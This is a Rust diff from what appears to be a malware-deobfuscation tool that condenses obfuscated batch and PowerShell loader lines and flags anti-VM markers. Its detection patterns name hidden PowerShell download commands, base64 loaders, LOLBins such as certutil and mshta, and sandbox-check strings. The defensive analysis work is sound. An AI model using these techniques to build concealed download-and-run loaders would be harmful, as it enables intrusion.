+    pending_markers: &mut Vec<&'static str>,
+    env: &mut Environment,
+) {
+    if *pending_lines == 0 {
+        return;
+    }
+    env.traits.push(crate::traits::Trait::LineTruncated {
+        original_len: *pending_original_len as u64,
+    });
+    let marker_suffix = if pending_markers.is_empty() {
+        String::new()
+    } else {
+        format!("; markers: {}", pending_markers.join(", "))
+    };
+    if *pending_lines == 1 {
+        if *pending_dense == 1 {
+            out.push_str(&format!(
+                "rem omitted dense percent-substring carrier line ({} bytes{}){}",
+                *pending_original_len, marker_suffix, *pending_ending
+            ));
+        } else {
+            out.push_str(&format!(
+                "rem omitted long unresolved percent-noise line ({} bytes{}){}",
+                *pending_original_len, marker_suffix, *pending_ending
+            ));
+        }
+    } else if *pending_dense == *pending_lines {
+        out.push_str(&format!(
+            "rem omitted {} dense percent-substring carrier lines ({} bytes{}){}",
+            *pending_lines, *pending_original_len, marker_suffix, *pending_ending
+        ));
+    } else {
+        out.push_str(&format!(
+            "rem omitted {} long unresolved percent-noise lines ({} bytes{}){}",
+            *pending_lines, *pending_original_len, marker_suffix, *pending_ending
+        ));
+    }
+    *pending_lines = 0;
+    *pending_original_len = 0;
+    *pending_dense = 0;
+    *pending_ending = "\n";
+    pending_markers.clear();
+}
+
+fn is_dense_percent_substring_carrier_line(line: &str) -> bool {
+    let trimmed = line.trim_start();
+    trimmed.is_ascii() && has_percent_substring_carrier_shape(trimmed)
+}
+
+fn has_percent_substring_carrier_shape(line: &str) -> bool {
+    let trimmed = line.trim_start();
+    let percent_count = trimmed.as_bytes().iter().filter(|&&b| b == b'%').count();
+    percent_count >= 32 && trimmed.matches(":~").count() >= 16
+}
+
+fn push_percent_noise_anti_analysis_markers(
+    line: &str,
+    markers: &[&'static str],
+    env: &mut Environment,
+) {
+    for target in markers {
+        let technique = "vm-sandbox-check".to_string();
+        let target = (*target).to_string();
+        if env.traits.iter().any(|t| {
+            matches!(
+                t,
+                crate::traits::Trait::AntiAnalysis {
+                    technique: existing_technique,
+                    target: existing_target,
+                    ..
+                } if existing_technique == &technique && existing_target == &target
+            )
+        }) {
+            continue;
+        }
+        env.traits.push(crate::traits::Trait::AntiAnalysis {
+            technique,
+            target,
+            command: format!("percent-noise-line: {}", snippet_prefix(line.trim(), 220)),
+        });
+    }
+}
+
+struct PercentNoiseLineSummary {
+    dense: bool,
+    markers: Vec<&'static str>,
+}
+
+fn classify_long_unresolved_percent_noise_line(line: &str) -> Option<PercentNoiseLineSummary> {
+    let trimmed = line.trim_start();
+    if trimmed.contains("://") {
+        return None;
+    }
+    if trimmed.starts_with("%0") || trimmed.starts_with("%~") {
+        return None;
+    }
+    let percent_count = trimmed.as_bytes().iter().filter(|&&b| b == b'%').count();
+    let dense_percent_refs = is_dense_long_percent_reference_line(trimmed, percent_count);
+    let dense_percent_substring_carrier = has_percent_substring_carrier_shape(trimmed);
+    let markers = if dense_percent_refs || skip_percent_noise_marker_scan(trimmed) {
+        Vec::new()
+    } else {
+        percent_noise_notable_markers(trimmed)
+    };
+    let markers_present = !markers.is_empty();
+    let sparse_percent_noise = trimmed.len() >= 512 && percent_count >= 6;
+    let percent_noise_label_comment = is_percent_noise_label_comment_line(trimmed, percent_count);
+    if trimmed.len() < 1024
+        && (trimmed.len() < 512 || (!markers_present && !sparse_percent_noise))
+        && !percent_noise_label_comment
+    {
+        return None;
+    }
+    let command = trimmed.strip_prefix('@').unwrap_or(trimmed);
+    let known_prefixes = [
+        "echo ",
+        "echo.",
+        "set ",
+        "if ",
+        "for ",
+        "call ",
+        "start ",
+        "cmd ",
+        "cmd.exe ",
+        "powershell",
+        "pwsh",
+        "certutil",
+        "mshta",
+        "rundll32",
+        "reg ",
+        "copy ",
+        "type ",
+        "curl",
+        "bitsadmin",
+        "wmic",
+        "cscript",
+        "wscript",
+    ];
+    if known_prefixes
+        .iter()
+        .any(|prefix| crate::util::starts_with_ascii_case_insensitive(command, prefix))
+    {
+        return None;
+    }
+    if percent_count < 8 && !sparse_percent_noise {
+        return None;
+    }
+    let dense = is_dense_percent_substring_carrier_line(line);
+    if dense_percent_substring_carrier && trimmed.len() < 16 * 1024 && !markers_present {
+        return None;
+    }
+    if markers_present {
+        return Some(PercentNoiseLineSummary { dense, markers });
+    }
+    if percent_noise_label_comment {
+        return Some(PercentNoiseLineSummary { dense, markers });
+    }
+    if dense_percent_substring_carrier {
+        return Some(PercentNoiseLineSummary { dense, markers });
+    }
+    if dense_percent_refs {
+        return Some(PercentNoiseLineSummary { dense, markers });
+    }
+    let alnum_count = trimmed.bytes().filter(u8::is_ascii_alphanumeric).count();
+    (alnum_count.saturating_mul(100) / trimmed.len() >= 70)
+        .then_some(PercentNoiseLineSummary { dense, markers })
+}
+
+fn is_percent_noise_label_comment_line(trimmed: &str, percent_count: usize) -> bool {
+    if !trimmed.starts_with(":%") || trimmed.contains("://") || percent_count < 8 {
+        return false;
+    }
+    let Some(last_percent) = trimmed.rfind('%') else {
+        return false;
+    };
+    let after_noise = trimmed[last_percent + 1..].trim();
+    after_noise.is_empty()
+}
+
+fn is_dense_long_percent_reference_line(trimmed: &str, percent_count: usize) -> bool {
+    trimmed.len() >= 512 * 1024
+        && percent_count >= 64
+        && percent_count.saturating_mul(100) >= trimmed.len().saturating_mul(10)
+}
+
+fn summarize_dense_unresolved_substring_fragment_lines(
+    text: &str,
+    env: &mut Environment,
+) -> String {
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut pending_lines = 0usize;
+    let mut pending_bytes = 0usize;
+    let mut pending_ending = "\n";
+
+    for line in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(line);
+        if let Some(cleaned) = clean_dense_unresolved_substr_prefix_quoted_powershell_payload(body)
+        {
+            flush_dense_unresolved_substring_fragment_run(
+                &mut out,
+                &mut pending_lines,
+                &mut pending_bytes,
+                &mut pending_ending,
+                env,
+            );
+            out.push_str(&cleaned);
+            out.push_str(ending);
+            continue;
+        }
+        if is_dense_unresolved_substring_fragment_line(body) {
+            pending_lines += 1;
+            pending_bytes = pending_bytes.saturating_add(line.len());
+            if ending == "\r\n" {
+                pending_ending = "\r\n";
+            }
+            continue;
+        }
+        flush_dense_unresolved_substring_fragment_run(
+            &mut out,
+            &mut pending_lines,
+            &mut pending_bytes,
+            &mut pending_ending,
+            env,
+        );
+        out.push_str(line);
+    }
+    flush_dense_unresolved_substring_fragment_run(
+        &mut out,
+        &mut pending_lines,
+        &mut pending_bytes,
+        &mut pending_ending,
+        env,
+    );
+    out
+}
+
+fn clean_dense_unresolved_substr_prefix_quoted_powershell_payload(line: &str) -> Option<String> {
+    let first_quote = line.find('"')?;
+    let last_quote = line.rfind('"')?;
+    if last_quote <= first_quote {
+        return None;
+    }
+    let prefix = &line[..first_quote];
+    if count_unresolved_substr_carrier_ops(prefix) < 8 {
+        return None;
+    }
+    let payload = &line[first_quote + 1..last_quote];
+    if payload.contains('"') || !payload.contains("://") {
+        return None;
+    }
+    let payload_lower = payload.to_ascii_lowercase();
+    if !(payload_lower.contains("downloadfile")
+        || payload_lower.contains("invoke-webrequest")
+        || payload_lower.contains("invoke-restmethod")
+        || payload_lower.contains("net.servicepointmanager"))
+    {
+        return None;
+    }
+    Some(format!(
+        "powershell.exe -WindowStyle Hidden -Command \"{payload}\""
+    ))
+}
+
+fn flush_dense_unresolved_substring_fragment_run(
+    out: &mut String,
+    pending_lines: &mut usize,
+    pending_bytes: &mut usize,
+    pending_ending: &mut &'static str,
+    env: &mut Environment,
+) {
+    if *pending_lines == 0 {
+        return;
+    }
+    env.traits.push(crate::traits::Trait::LineTruncated {
+        original_len: *pending_bytes as u64,
+    });
+    if *pending_lines == 1 {
+        out.push_str(&format!(
+            "rem omitted dense unresolved substring-fragment line ({} bytes){}",
+            *pending_bytes, *pending_ending
+        ));
+    } else {
+        out.push_str(&format!(
+            "rem omitted {} dense unresolved substring-fragment lines ({} bytes){}",
+            *pending_lines, *pending_bytes, *pending_ending
+        ));
+    }
+    *pending_lines = 0;
+    *pending_bytes = 0;
+    *pending_ending = "\n";
+}
+
+fn is_dense_unresolved_substring_fragment_line(line: &str) -> bool {
+    let trimmed = line.trim_start();
+    if trimmed.len() < 80 || trimmed.starts_with("rem omitted ") || trimmed.contains("://") {
+        return false;
+    }
+    let percent_count = trimmed.as_bytes().iter().filter(|&&b| b == b'%').count();
+    if percent_count > 16 {
+        return false;
+    }
+
+    let substring_refs = trimmed.matches(":~").count();
+    substring_refs >= 8 && trimmed.matches(",1").count() >= substring_refs.saturating_sub(1)
+}
+
+fn skip_percent_noise_marker_scan(line: &str) -> bool {
+    let trimmed = line.trim_start();
+    if trimmed.len() < 1024 * 1024 {
+        return false;
+    }
+    let percent_count = trimmed.as_bytes().iter().filter(|&&b| b == b'%').count();
+    is_dense_long_percent_reference_line(trimmed, percent_count)
+}
+
+fn percent_noise_notable_markers(line: &str) -> Vec<&'static str> {
+    let mut markers = Vec::new();
+    for (needle, label) in [
+        ("qemu harddisk", "QEMU HARDDISK"),
+        ("dady harddisk", "DADY HARDDISK"),
+        ("wds100t2b0a", "WDS100T2B0A"),
+        ("virtualbox", "VirtualBox"),
+        ("bochs_", "BOCHS_"),
+        ("bxpc___", "BXPC___"),
+        ("qemu", "QEMU"),
+    ] {
+        if crate::util::contains_ascii_case_insensitive(line, needle) && !markers.contains(&label) {
+            markers.push(label);
+        }
+    }
+    markers
+}
+
+fn summarize_long_powershell_marker_base64_lines(text: &str, env: &mut Environment) -> String {
+    let mut out = String::with_capacity(text.len());
+    let mut changed = false;
+    for line in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(line);
+        if is_long_powershell_marker_base64_line(body) {
+            changed = true;
+            env.traits.push(crate::traits::Trait::LineTruncated {
+                original_len: body.len() as u64,
+            });
+            if let Some(marker) = powershell_replace_marker(body) {
+                out.push_str(&format!(
+                    "rem omitted long PowerShell marker/base64 wrapper line ({} bytes; marker: {}){}",
+                    body.len(),
+                    marker,
+                    ending
+                ));
+            } else {
+                out.push_str(&format!(
+                    "rem omitted long PowerShell marker/base64 wrapper line ({} bytes){}",
+                    body.len(),
+                    ending
+                ));
+            }
+        } else {
+            out.push_str(line);
+        }
+    }
+    if changed {
+        out
+    } else {
+        text.to_string()
+    }
+}
+
+fn is_long_powershell_marker_base64_line(line: &str) -> bool {
+    if line.len() < 2048 {
+        return false;
+    }
+    let lower = line.to_ascii_lowercase();
+    lower.contains("powershell")
+        && lower.contains("frombase64string")
+        && lower.contains(".replace(")
+}
+
+fn powershell_replace_marker(line: &str) -> Option<String> {
+    let lower = line.to_ascii_lowercase();
+    for needle in [".replace('", ".replace(\""] {
+        let Some(start) = lower.find(needle).map(|idx| idx + needle.len()) else {
+            continue;
+        };
+        let quote = if needle.ends_with('\'') { '\'' } else { '"' };
+        let rest = line.get(start..)?;
+        let end = rest.find(quote)?;
+        let marker = &rest[..end];
+        if !marker.is_empty() && marker.len() <= 64 {
+            return Some(marker.to_string());
+        }
+    }
+    None
+}
+
+fn summarize_residual_opaque_base64_carrier_lines(text: &str, env: &mut Environment) -> String {
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut changed = false;
+    for line in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(line);
+        let Some(payload) = residual_opaque_base64_payload(body) else {
+            out.push_str(line);
+            continue;
+        };
+        rescue_truncated_urls(payload, body.len(), env);
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: body.len() as u64,
+        });
+        out.push_str(&format!(
+            "rem omitted residual opaque base64 carrier line ({} bytes){}",
+            payload.len(),
+            ending
+        ));
+        changed = true;
+    }
+
+    if changed {
+        out
+    } else {
+        text.to_string()
+    }
+}
+
+fn residual_opaque_base64_payload(line: &str) -> Option<&str> {
+    const MIN_RESIDUAL_B64_BYTES: usize = 4096;
+
+    let trimmed = line.trim();
+    let payload = trimmed
+        .strip_prefix('@')
+        .map(str::trim_start)
+        .unwrap_or(trimmed);
+    if payload.len() < MIN_RESIDUAL_B64_BYTES || payload.contains("://") {
+        return None;
+    }
+    if !payload.bytes().all(is_base64_carrier_byte) {
+        return None;
+    }
+    Some(payload)
+}
+
+fn summarize_quoted_base64_fragment_line_runs(text: &str) -> Option<String> {
+    const MIN_QUOTED_B64_FRAGMENT_RUN: usize = 8;
+
+    let mut out = String::with_capacity(text.len());
+    let mut pending: Vec<String> = Vec::new();
+    let mut changed = false;
+
+    for line in text.split_inclusive('\n') {
+        let (body, _ending) = split_line_ending(line);
+        if is_quoted_base64_fragment_line(body) {
+            pending.push(line.to_string());
+            continue;
+        }
+        flush_quoted_base64_fragment_run(
+            &mut out,
+            &mut pending,
+            MIN_QUOTED_B64_FRAGMENT_RUN,
+            &mut changed,
+        );
+        out.push_str(line);
+    }
+    flush_quoted_base64_fragment_run(
+        &mut out,
+        &mut pending,
+        MIN_QUOTED_B64_FRAGMENT_RUN,
+        &mut changed,
+    );
+
+    changed.then_some(out)
+}
+
+fn flush_quoted_base64_fragment_run(
+    out: &mut String,
+    pending: &mut Vec<String>,
+    min_run: usize,
+    changed: &mut bool,
+) {
+    if pending.is_empty() {
+        return;
+    }
+    if pending.len() < min_run {
+        for line in pending.drain(..) {
+            out.push_str(&line);
+        }
+        return;
+    }
+
+    let bytes: usize = pending.iter().map(|line| line.len()).sum();
+    out.push_str(&format!(
+        "rem omitted {} quoted base64 fragment lines ({} bytes)\r\n",
+        pending.len(),
+        bytes
+    ));
+    pending.clear();
+    *changed = true;
+}
+
+fn is_quoted_base64_fragment_line(line: &str) -> bool {
+    let trimmed = line.trim();
+    let inner = trimmed
+        .strip_prefix('"')
+        .and_then(|value| value.strip_suffix('"'))
+        .or_else(|| {
+            trimmed
+                .strip_prefix('\'')
+                .and_then(|value| value.strip_suffix('\''))
+        });
+    let Some(inner) = inner else {
+        return false;
+    };
+    (8..=64).contains(&inner.len())
+        && inner.bytes().all(is_base64_carrier_byte)
+        && inner
+            .bytes()
+            .any(|byte| byte.is_ascii_alphabetic() || byte == b'=')
+}
+
+fn summarize_standalone_inline_powershell_command(
+    text: &str,
+    env: &mut Environment,
+) -> Option<String> {
+    let mut non_empty_lines = text.lines().filter(|line| !line.trim().is_empty());
+    let line = non_empty_lines.next()?;
+    if non_empty_lines.next().is_some() || !is_long_inline_powershell_command_line(line) {
+        return None;
+    }
+    let ps1_count_before = env.exec_ps1.len() + env.all_extracted_ps1.len();
+    deob_scan::scan_embedded_powershell_invocations(text, env);
+    let ps1_count_after = env.exec_ps1.len() + env.all_extracted_ps1.len();
+    if ps1_count_after == ps1_count_before {
+        return None;
+    }
+    Some(summarize_long_inline_powershell_command_lines(text, env))
+}
+
+fn summarize_long_inline_powershell_command_lines(text: &str, env: &mut Environment) -> String {
+    let mut out = String::with_capacity(text.len());
+    let mut changed = false;
+    for line in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(line);
+        if is_long_inline_powershell_command_line(body) {
+            changed = true;
+            env.traits.push(crate::traits::Trait::LineTruncated {
+                original_len: body.len() as u64,
+            });
+            let details = long_inline_powershell_summary_details(body);
+            if details.is_empty() {
+                out.push_str(&format!(
+                    "rem omitted long inline PowerShell command line ({} bytes){}",
+                    body.len(),
+                    ending
+                ));
+            } else {
+                out.push_str(&format!(
+                    "rem omitted long inline PowerShell command line ({} bytes; {}){}",
+                    body.len(),
+                    details.join("; "),
+                    ending
+                ));
+            }
+        } else {
+            out.push_str(line);
+        }
+    }
+    if changed {
+        out
+    } else {
+        text.to_string()
+    }
+}
+
+fn summarize_empty_powershell_file_argument_preview_lines(
+    text: &str,
+    env: &mut Environment,
+) -> String {
+    if !text.lines().any(|line| {
+        is_empty_powershell_outfile_preview_line(line)
+            || is_empty_powershell_expand_archive_preview_line(line)
+    }) {
+        return text.to_string();
+    }
+
+    let mut out = String::with_capacity(text.len());
+    let mut changed = false;
+    let mut previous_download_urls: Vec<String> = Vec::new();
+    for line in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(line);
+        if is_empty_powershell_expand_archive_preview_line(body) {
+            out.push_str(&format!(
+                "rem omitted empty PowerShell file-argument preview (Expand-Archive){}",
+                ending
+            ));
+            env.traits.push(crate::traits::Trait::LineTruncated {
+                original_len: body.len() as u64,
+            });
+            changed = true;
+            continue;
+        }
+        if is_empty_powershell_outfile_preview_line(body) {
+            let preview_uri = powershell_named_argument(body, "-Uri")
+                .or_else(|| long_inline_powershell_summary_urls(body).into_iter().next());
+            if preview_uri.as_deref().is_some_and(|uri| {
+                previous_download_urls
+                    .iter()
+                    .any(|seen| urls_match(seen, uri))
+            }) {
+                env.traits.push(crate::traits::Trait::LineTruncated {
+                    original_len: body.len() as u64,
+                });
+                changed = true;
+                previous_download_urls.clear();
+                continue;
+            }
+            let detail = preview_uri
+                .map(|uri| format!("; url: {uri}"))
+                .unwrap_or_default();
+            out.push_str(&format!(
+                "rem omitted empty PowerShell file-argument preview (Invoke-WebRequest{}){}",
+                detail, ending
+            ));
+            env.traits.push(crate::traits::Trait::LineTruncated {
+                original_len: body.len() as u64,
+            });
+            changed = true;
+            continue;
+        }
+        out.push_str(line);
+        previous_download_urls = powershell_download_urls_recorded_by_line(body);
+    }
+
+    if changed {
+        out
+    } else {
+        text.to_string()
+    }
+}
+
+fn powershell_download_urls_recorded_by_line(line: &str) -> Vec<String> {
+    let mut urls = long_inline_powershell_summary_urls(line);
+    if crate::util::contains_ascii_case_insensitive(line, "Invoke-WebRequest")
+        && !has_empty_powershell_named_argument(line, "-OutFile")
+    {
+        if let Some(uri) = powershell_named_argument(line, "-Uri") {
+            if !urls.iter().any(|existing| urls_match(existing, &uri)) {
+                urls.push(uri);
+            }
+        }
+    }
+    urls
+}
+
+fn urls_match(left: &str, right: &str) -> bool {
+    left.eq_ignore_ascii_case(right)
+}
+
+fn is_empty_powershell_outfile_preview_line(line: &str) -> bool {
+    if !line_has_powershell_launcher(line)
+        || !crate::util::contains_ascii_case_insensitive(line, "Invoke-WebRequest")
+    {
+        return false;
+    }
+    has_empty_powershell_named_argument(line, "-OutFile")
+}
+
+fn is_empty_powershell_expand_archive_preview_line(line: &str) -> bool {
+    if !line_has_powershell_launcher(line)
+        || !crate::util::contains_ascii_case_insensitive(line, "Expand-Archive")
+    {
+        return false;
+    }
+    let path = powershell_named_argument(line, "-Path");
+    let dst = powershell_named_argument(line, "-DestinationPath");
+    path.as_deref().is_some_and(|value| value.trim().is_empty())
+        && dst.as_deref().is_some_and(|value| value.trim().is_empty())
+}
+
+fn has_empty_powershell_named_argument(line: &str, needle: &str) -> bool {
+    let mut search_from = 0usize;
+    while let Some(pos) = crate::util::find_ascii_case_insensitive_from(line, needle, search_from) {
+        search_from = pos.saturating_add(1);
+        if pos > 0
+            && line
+                .as_bytes()
+                .get(pos - 1)
+                .is_some_and(|byte| byte.is_ascii_alphanumeric() || *byte == b'_')
+        {
+            continue;
+        }
+        let mut idx = pos + needle.len();
+        if line
+            .as_bytes()
+            .get(idx)
+            .is_some_and(|byte| byte.is_ascii_alphanumeric() || *byte == b'_')
+        {
+            continue;
+        }
+        idx = skip_ascii_ws_str(line, idx);
+        if matches!(line.as_bytes().get(idx), Some(b':' | b'=')) {
+            idx = skip_ascii_ws_str(line, idx + 1);
+        }
+        if matches!(
+            line.as_bytes().get(idx..idx + 2),
+            Some(b"''") | Some(b"\"\"")
+        ) {
+            return true;
+        }
+    }
+    false
+}
+
+fn line_has_powershell_launcher(line: &str) -> bool {
+    let lower = line.to_ascii_lowercase();
+    lower.contains("powershell") || lower.contains("pwsh")
+}
+
+fn split_long_compound_command_chain_lines(text: &str) -> String {
+    let mut out = String::with_capacity(text.len());
+    let mut changed = false;
+    for line in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(line);
+        let Some(parts) = split_compound_command_chain_line(body) else {
+            out.push_str(line);
+            continue;
+        };
+        changed = true;
+        for part in parts {
+            out.push_str(&part);
+            out.push_str(ending);
+        }
+    }
+    if changed {
+        out
+    } else {
+        text.to_string()
+    }
+}
+
+fn split_compound_command_chain_line(line: &str) -> Option<Vec<String>> {
+    if !line.contains(';') {
+        return None;
+    }
+    let lower = line.trim_start().to_ascii_lowercase();
+    if !lower.contains("powershell") || !line_contains_ps_download_action(&lower) {
+        return None;
+    }
+    if line.len() < 384
+        && !line_contains_archive_extraction_action(&lower)
+        && !line_contains_download_process_chain(&lower)
+    {
+        return None;
+    }
+
+    let mut parts = Vec::new();
+    let mut start = 0usize;
+    let mut in_single = false;
+    let mut in_double = false;
+    for (idx, ch) in line.char_indices() {
+        match ch {
+            '\'' if !in_double => in_single = !in_single,
+            '"' if !in_single => in_double = !in_double,
+            ';' if !in_single && !in_double => {
+                let next = line[idx + ch.len_utf8()..].trim_start();
+                if starts_compound_chain_command(next) {
+                    let part = line[start..idx].trim();
+                    if !part.is_empty() {
+                        parts.push(part.to_string());
+                    }
+                    start = idx + ch.len_utf8() + (line[idx + ch.len_utf8()..].len() - next.len());
+                }
+            }
+            _ => {}
+        }
+    }
+
+    if parts.is_empty() {
+        return split_quoted_powershell_command_chain_line(line);
+    }
+    let tail = line[start..].trim();
+    if !tail.is_empty() {
+        parts.push(tail.to_string());
+    }
+    if parts.len() >= 2 {
+        return Some(parts);
+    }
+    split_quoted_powershell_command_chain_line(line)
+}
+
+fn split_quoted_powershell_command_chain_line(line: &str) -> Option<Vec<String>> {
+    let lower = line.to_ascii_lowercase();
+    if !line_contains_ps_download_action(&lower) {
+        return None;
+    }
+
+    let Some((body_start, body_end, quote)) = quoted_powershell_command_body_span(line) else {
+        return split_malformed_quoted_powershell_semicolon_chain_line(line);
+    };
+    if !line[body_end + quote.len_utf8()..].trim().is_empty() {
+        return split_malformed_quoted_powershell_semicolon_chain_line(line);
+    }
+    let body = &line[body_start..body_end];
+    let statements = split_powershell_top_level_semicolon_statements(body);
+    let download_count = statements
+        .iter()
+        .filter(|statement| statement_contains_ps_download_action(statement))
+        .count();
+    let has_archive = statements.iter().any(|statement| {
+        contains_ascii_case_insensitive_bytes(statement.as_bytes(), b"ExtractToDirectory")
+            || contains_ascii_case_insensitive_bytes(statement.as_bytes(), b"Expand-Archive")
+    });
+    if statements.len() < 2 || download_count == 0 || (download_count < 2 && !has_archive) {
+        return None;
+    }
+
+    let prefix = &line[..body_start];
+    Some(
+        statements
+            .into_iter()
+            .map(|statement| format!("{prefix}{statement}{quote}"))
+            .collect(),
+    )
+}
+
+fn split_malformed_quoted_powershell_semicolon_chain_line(line: &str) -> Option<Vec<String>> {
+    let lower = line.to_ascii_lowercase();
+    if !line_contains_ps_download_action(&lower) || !lower.contains("-command") {
+        return None;
+    }
+    let command_pos = crate::util::find_ascii_case_insensitive_from(line, "-Command", 0)?;
+    let quote_idx = skip_ascii_ws_str(line, command_pos + "-Command".len());
+    let quote = line[quote_idx..].chars().next()?;
+    if quote != '"' && quote != '\'' {
+        return None;
+    }
+    let body_start = quote_idx + quote.len_utf8();
+    let mut body = line[body_start..].trim();
+    body = body.trim_end_matches(quote).trim_end();
+    let statements = split_powershell_semicolon_statements_ignoring_double_quotes(body);
+    let download_count = statements
+        .iter()
+        .filter(|statement| statement_contains_ps_download_action(statement))
+        .count();
+    let has_process_action = statements.iter().any(|statement| {
+        contains_ascii_case_insensitive_bytes(statement.as_bytes(), b"Start-Process")
+            || statement
+                .trim_start()
+                .to_ascii_lowercase()
+                .starts_with("start ")
+    });
+    if statements.len() < 2 || download_count < 2 || !has_process_action {
+        return None;
+    }
+
+    let prefix = &line[..body_start];
+    Some(
+        statements
+            .into_iter()
+            .map(|statement| format!("{prefix}{statement}{quote}"))
+            .collect(),
+    )
+}
+
+fn split_powershell_semicolon_statements_ignoring_double_quotes(body: &str) -> Vec<&str> {
+    let mut parts = Vec::new();
+    let mut start = 0usize;
+    let mut in_single = false;
+    for (idx, ch) in body.char_indices() {
+        match ch {
+            '\'' => in_single = !in_single,
+            ';' if !in_single => {
+                let part = body[start..idx].trim();
+                if !part.is_empty() {
+                    parts.push(part);
+                }
+                start = idx + ch.len_utf8();
+            }
+            _ => {}
+        }
+    }
+    let tail = body[start..].trim();
+    if !tail.is_empty() {
+        parts.push(tail);
+    }
+    parts
+}
+
+fn line_contains_ps_download_action(lower: &str) -> bool {
+    lower.contains("downloadfile")
+        || lower.contains("invoke-webrequest")
+        || lower.contains(" iwr ")
+        || lower.contains(" iwr\t")
+        || lower.contains("\"iwr ")
+        || lower.contains("'iwr ")
+}
+
+fn line_contains_archive_extraction_action(lower: &str) -> bool {
+    lower.contains("extracttodirectory") || lower.contains("expand-archive")
+}
+
+fn line_contains_download_process_chain(lower: &str) -> bool {
+    (lower.contains("start-process") || lower.contains("; start "))
+        && (lower.matches("invoke-webrequest").count()
+            + lower.matches("downloadfile").count()
+            + lower.matches("iwr ").count()
+            >= 2)
+}
+
+fn statement_contains_ps_download_action(statement: &str) -> bool {
+    let lower = statement.trim_start().to_ascii_lowercase();
+    lower.contains("downloadfile")
+        || lower.contains("invoke-webrequest")
+        || lower.starts_with("iwr ")
+        || lower.starts_with("iwr\t")
+        || lower.starts_with("& iwr ")
+        || lower.starts_with("&iwr ")
+}
+
+fn quoted_powershell_command_body_span(line: &str) -> Option<(usize, usize, char)> {
+    let mut search_from = 0usize;
+    while let Some(command_pos) =
+        crate::util::find_ascii_case_insensitive_from(line, "-Command", search_from)
+    {
+        let quote_idx = skip_ascii_ws_str(line, command_pos + "-Command".len());
+        let quote = line[quote_idx..].chars().next()?;
+        if quote == '"' || quote == '\'' {
+            let mut end = quote_idx + quote.len_utf8();
+            while end < line.len() {
+                let ch = line[end..].chars().next()?;
+                if ch == quote {
+                    return Some((quote_idx + quote.len_utf8(), end, quote));
+                }
+                end += ch.len_utf8();
+            }
+            return None;
+        }
+        search_from = command_pos + "-Command".len();
+    }
+    None
+}
+
+fn split_powershell_top_level_semicolon_statements(body: &str) -> Vec<&str> {
+    let mut parts = Vec::new();
+    let mut start = 0usize;
+    let mut in_single = false;
+    let mut in_double = false;
+    for (idx, ch) in body.char_indices() {
+        match ch {
+            '\'' if !in_double => in_single = !in_single,
+            '"' if !in_single => in_double = !in_double,
+            ';' if !in_single && !in_double => {
+                let part = body[start..idx].trim();
+                if !part.is_empty() {
+                    parts.push(part);
+                }
+                start = idx + ch.len_utf8();
+            }
+            _ => {}
+        }
+    }
+    let tail = body[start..].trim();
+    if !tail.is_empty() {
+        parts.push(tail);
+    }
+    parts
+}
+
+fn starts_compound_chain_command(text: &str) -> bool {
+    let lower = text.trim_start().to_ascii_lowercase();
+    lower.starts_with("powershell ")
+        || lower.starts_with("powershell.exe ")
+        || lower.starts_with("pwsh ")
+        || lower.starts_with("pwsh.exe ")
+        || starts_with_full_path_powershell_launcher(&lower)
+        || starts_with_cmd_wrapped_powershell(&lower)
+}
+
+fn is_long_inline_powershell_command_line(line: &str) -> bool {
+    let lower = line.trim_start().to_ascii_lowercase();
+    let starts_with_powershell_launcher = lower.starts_with("start ")
+        || lower.starts_with("powershell ")
+        || lower.starts_with("powershell.exe ")
+        || lower.starts_with("pwsh ")
+        || lower.starts_with("pwsh.exe ")
+        || starts_with_full_path_powershell_launcher(&lower)
+        || starts_with_cmd_wrapped_powershell(&lower);
+    let starts_with_renamed_loader = starts_with_probable_renamed_powershell_loader(&lower)
+        && has_powershell_loader_markers(&lower);
+    if line.len() < 2048 {
+        return (line.len() >= 320
+            && starts_with_powershell_launcher
+            && lower.contains("[system.net.webrequest]::create")
+            && lower.contains("getresponsestream")
+            && !long_inline_powershell_summary_details(line).is_empty())
+            || (line.len() >= 240
+                && starts_with_powershell_launcher
+                && lower.contains("invoke-webrequest")
+                && lower.contains("-outfile")
+                && !long_inline_powershell_summary_details(line).is_empty())
+            || (line.len() >= 240
+                && starts_with_powershell_launcher
+                && lower.contains("new-object system.net.webclient")
+                && lower.contains("downloadfile")
+                && lower.contains("user-agent")
+                && !long_inline_powershell_summary_details(line).is_empty())
+            || (line.len() >= 512
+                && starts_with_powershell_launcher
+                && lower.contains("char[]")
+                && !long_inline_powershell_summary_details(line).is_empty())
+            || (line.len() >= 1024 && starts_with_renamed_loader);
+    }
+    (starts_with_powershell_launcher
+        && (lower.contains("powershell") || lower.contains("pwsh"))
+        && (lower.contains("function ")
+            || lower.contains("+='ion:'")
+            || lower.contains("+=\"ion:\"")
+            || lower.contains("[byte[]]")
+            || lower.contains("downloadfile")
+            || lower.contains("new-object net.webclient")
+            || lower.contains("http://")
+            || lower.contains("https://")
+            || is_split_dynamic_function_provider(&lower)))
+        || starts_with_renamed_loader
+}
+
+fn starts_with_cmd_wrapped_powershell(lower: &str) -> bool {
+    let Some((token, rest)) = first_command_token_and_rest(lower) else {
+        return false;
+    };
+    let normalized = token.replace('/', "\\");
+    if token != "cmd" && token != "cmd.exe" && !normalized.ends_with("\\cmd.exe") {
+        return false;
+    }
+    let rest = rest.trim_start();
+    let rest = rest.strip_prefix("/c").unwrap_or(rest).trim_start();
+    rest.starts_with("powershell ")
+        || rest.starts_with("powershell.exe ")
+        || rest.starts_with("pwsh ")
+        || rest.starts_with("pwsh.exe ")
+}
+
+fn starts_with_full_path_powershell_launcher(lower: &str) -> bool {
+    let Some(token) = first_command_token(lower) else {
+        return false;
+    };
+    let normalized = token.replace('/', "\\");
+    (normalized.ends_with("\\powershell.exe") && normalized.contains("\\windowspowershell\\"))
+        || normalized.ends_with("\\pwsh.exe")
+}
+
+fn starts_with_probable_renamed_powershell_loader(lower: &str) -> bool {
+    let Some(token) = first_command_token(lower) else {
+        return false;
+    };
+    let normalized = token.replace('/', "\\");
+    let has_scriptable_extension = normalized.ends_with(".exe")
+        || normalized.ends_with(".scr")
+        || normalized.ends_with(".com")
+        || normalized.ends_with(".bat")
+        || normalized.ends_with(".cmd");
